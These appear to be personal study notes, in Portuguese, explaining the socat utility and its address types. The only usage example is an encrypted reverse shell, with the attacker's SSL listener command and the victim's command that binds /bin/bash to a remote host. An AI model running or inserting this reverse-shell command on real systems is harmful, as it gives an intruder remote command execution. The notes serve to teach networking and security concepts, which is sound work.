Utilitário para conectar duas pontas de `I/O` e transferir informações entre elas. Essa ponta pode ser uma stream de dados ([[5. Socket|sockets]] [[5. TCP]], arquivos etc), sockets não orientados à conexão ([[5. UDP]]) etc.

O `socat` recebe dois parâmetros cada um representando uma ponta. O tipo de cada ponta é identificado pelo seu `address type`. Os `address types` mais comuns são:

- `exec:<command>`:  executa o comando especificado e liga a entrada e saída com a outra ponta. Exemplo `exec:/bin/bash` 
- `tcp:<host>:<port>`: cria um socket tcp para se conectar com `host:port`
- `tcp-listen:<port>`: cria um socket tcp em modo listening em `port`
- `openssl-listen:<port>`: mesma coisa do `address type` `tcp-listen`, contudo criptografa a comunicação. Espera receber opções como `,cert=cert.pem,key=key.pem`. Exemplo: `openssl-listen:80,cert=cert.pem,key=key.pem`.
- `-`: "coringa" que significa `stdin/stdout`, ou seja, as stream de entrada e saída padrão se ligam à outra ponta.

# Exemplo de uso

## Reverse shell criptografado

```shell
# atacante
$ socat - openssl-listen:443,cert=cert.pem,key=key.pem,verify=0
```

```shell
# vítima (poderia ser qualquer outro utilitário para se conectar)
$ socat exec:/bin/bash openssl:host:443,verify=0
```

Exemplo acima o atacante estabelece e liga duas pontas:
- socket TCP criptografado com SSL em modo listening.
- saída e entrada padrão (permite envio e recebimento de dados pelo socket acima)

Enquanto do lado da vítima outras duas pontas são estabelecidas e ligadas:
- socket TCP criptografado para se conectar ao socket do atacante
- executa o `/bin/bash`; toda entrada do socket aberto vai para a entrada do `/bin/bash`, enquanto toda saída do `/bin/bash` vai para o socket, permitindo a execução remota de comandos.
